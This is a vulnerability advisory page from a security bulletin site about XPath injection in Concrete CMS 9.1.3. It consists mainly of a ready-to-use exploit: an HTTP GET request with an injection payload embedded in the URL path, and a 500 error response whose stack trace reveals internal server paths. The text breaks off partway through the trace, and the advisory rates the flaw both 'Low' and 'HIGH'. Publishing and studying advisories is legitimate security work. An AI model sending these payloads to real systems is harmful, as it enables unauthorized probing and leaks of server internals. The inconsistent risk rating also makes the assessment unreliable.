---
title: Concrete CMS 9.1.3 XPATH Injection
url: https://cxsecurity.com/issue/WLB-2022110049
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-30
fetch_date: 2025-10-04T00:03:37.325972
---

# Concrete CMS 9.1.3 XPATH Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Concrete CMS 9.1.3 XPATH Injection** **2022.11.29**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

## Title: concretecms-9.1.3 Xpath injection
## Author: nu11secur1ty
## Date: 11.28.2022
## Vendor: https://www.concretecms.org/
## Software: https://www.concretecms.org/download
## Reference: https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/concretecms.org/2022/concretecms-9.1.3
## Description:
The URL path folder `3` appears to be vulnerable to XPath injection attacks.
The test payload 50539478' or 4591=4591-- was submitted in the URL
path folder `3`, and an XPath error message was returned.
The attacker can flood with requests the system by using this
vulnerability to untilted he receives the actual paths of the all
content of this system which content is stored on some internal or
external server.
## STATUS: HIGH Vulnerability
[+] Exploits:
00:
```GET
GET /concrete-cms-9.1.3/index.php/ccm50539478'%20or%204591%3d4591--%20/assets/localization/moment/js
HTTP/1.1
Host: pwnedhost.com
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107
Safari/537.36
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="107", "Chromium";v="107"
Sec-CH-UA-Platform: Windows
Sec-CH-UA-Mobile: ?0
Content-Length: 0
```
[+] Response:
```HTTP
HTTP/1.1 500 Internal Server Error
Date: Mon, 28 Nov 2022 15:32:22 GMT
Server: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.30
X-Powered-By: PHP/7.4.30
Connection: close
Content-Type: text/html;charset=UTF-8
Content-Length: 592153
<!DOCTYPE html><!--
Whoops\Exception\ErrorException: include(): Failed opening
&#039;C:/xampp/htdocs/pwnedhost/concrete-cms-9.1.3/application/files/cache/expensive\0fea6a13c52b4d47\25368f24b045ca84\38a865804f8fdcb6\57cd99682e939275\3e7d68124ace5663\5a578007c2573b03\d35376a9b3047dec\fee81596e3895419.php&#039;
for inclusion (include\_path=&#039;C:/xampp/htdocs/pwnedhost/concrete-cms-9.1.3/concrete/vendor;C:\xampp\php\PEAR&#039;)
in file C:\xampp\htdocs\pwnedhost\concrete-cms-9.1.3\concrete\vendor\tedivm\stash\src\Stash\Driver\FileSystem\NativeEncoder.php
on line 26
Stack trace:
1. Whoops\Exception\ErrorException-&gt;()
C:\xampp\htdocs\pwnedhost\concrete-cms-9.1.3\concrete\vendor\tedivm\stash\src\Stash\Driver\FileSystem\NativeEncoder.php:26
2. include() C:\xampp\htdocs\pwnedhost\concrete-cms-9.1.3\concrete\vendor\tedivm\stash\src\Stash\Driver\FileSystem\NativeEncoder.php:26
3. Stash\Driver\FileSystem\NativeEncoder-&gt;deserialize()
C:\xampp\htdocs\pwnedhost\concrete-cms-9.1.3\concrete\vendor\tedivm\stash\src\Stash\Driver\FileSystem.php:201
4. Stash\Driver\FileSystem-&gt;getData()
C:\xampp\htdocs\pwnedhost\concrete-cms-9.1.3\concrete\vendor\tedivm\stash\src\Stash\Item.php:631
5. Stash\Item-&gt;getRecord()
C:\xampp\htdocs\pwnedhost\concrete-cms-9.1.3\concrete\vendor\tedivm\stash\src\Stash\Item.php:321
6. Stash\Item-&gt;executeGet()
C:\xampp\htdocs\pwnedhost\concrete-cms-9.1.3\concrete\vendor\tedivm\stash\src\Stash\Item.php:252
7. Stash\Item-&gt;get()
C:\xampp\htdocs\pwnedhost\concrete-cms-9.1.3\concrete\vendor\tedivm\stash\src\Stash\Item.php:346
8. Stash\Item-&gt;isMiss()
C:\xampp\htdocs\pwnedhost\concrete-cms-9.1.3\concrete\src\Cache\Adapter\LaminasCacheDriver.php:67
9. Concrete\Core\Cache\Adapter\LaminasCacheDriver-&gt;internalGetItem()
C:\xampp\htdocs\pwnedhost\concrete-cms-9.1.3\concrete\vendor\laminas\laminas-cache\src\Storage\Adapter\AbstractAdapter.php:356
10. Laminas\Cache\Storage\Adapter\AbstractAdapter-&gt;getItem()
C:\xampp\htdocs\pwnedhost\concrete-cms-9.1.3\concrete\vendor\laminas\laminas-i18n\src\Translator\Translator.php:601
11. Laminas\I18n\Translator\Translator-&gt;loadMessages()
C:\xampp\htdocs\pwnedhost\concrete-cms-9.1.3\concrete\vendor\laminas\laminas-i18n\src\Translator\Translator.php:434
12. Laminas\I18n\Translator\Translator-&gt;getTranslatedMessage()
C:\xampp\htdocs\pwnedhost\concrete-cms-9.1.3\concrete\vendor\laminas\laminas-i18n\src\Translator\Translator.php:349
13. Laminas\I18n\Translator\Translator-&gt;translate()
C:\xampp\htdocs\pwnedhost\concrete-cms-9.1.3\concrete\src\Localization\Translator\Adapter\Laminas\TranslatorAdapter.php:69
14. Concrete\Core\Localization\Translator\Adapter\Laminas\TranslatorAdapter-&gt;translate()
C:\xampp\htdocs\pwnedhost\concrete-cms-9.1.3\concrete\bootstrap\helpers.php:27
15. t() C:\xampp\htdocs\pwnedhost\concrete-cms-9.1.3\concrete\blocks\top\_navigation\_bar\view.php:47
16. include() C:\xampp\htdocs\pwnedhost\concrete-cms-9.1.3\concrete\src\Block\View\BlockView.php:267
17. Concrete\Core\Block\View\BlockView-&gt;renderViewContents()
C:\xampp\htdocs\pwnedhost\concrete-cms-9.1.3\concrete\src\View\AbstractView.php:164
18. Concrete\Core\View\AbstractView-&gt;render()
C:\xampp\htdocs\pwnedhost\concrete-cms-9.1.3\concrete\src\Area\Area.php:853
19. Concrete\Core\Area\Area-&gt;display()
C:\xampp\htdocs\pwnedhost\concrete-cms-9.1.3\concrete\src\Area\GlobalArea.php:128
20. Concrete\Core\Area\GlobalArea-&gt;display()
C:\xampp\htdocs\pwnedhost\concrete-cms-9.1.3\concrete\themes\atomik\elements\header.php:11
21. include() C:\xampp\htdocs\pwnedhost\concrete-cms-9.1.3\concrete\src\View\View.php:125
22. Concrete\Core\View\View-&gt;inc()
C:\xampp\htdocs\pwnedhost\concrete-cms-9.1.3\concrete\themes\atomik\view.php:4
23. include() C:\xampp\htdocs\pwnedhost\concrete-cms-9.1.3\concrete\src\View\View.php:329
24. Concrete\Core\View\View-&gt;renderTemplate()
C:\xampp\htdocs\pwnedhost\concrete-cms-9.1.3\concrete\src\View\View.php:291
25. Concrete\Core\View\View-&gt;renderViewContents()
C:\xampp\htdocs\pwnedhost\concrete-cms-9.1.3\concrete\src\View\AbstractView.php:164
26. Concrete\Core\View\AbstractView-&gt;render()
C:\xampp\htdocs\pwnedhost\con...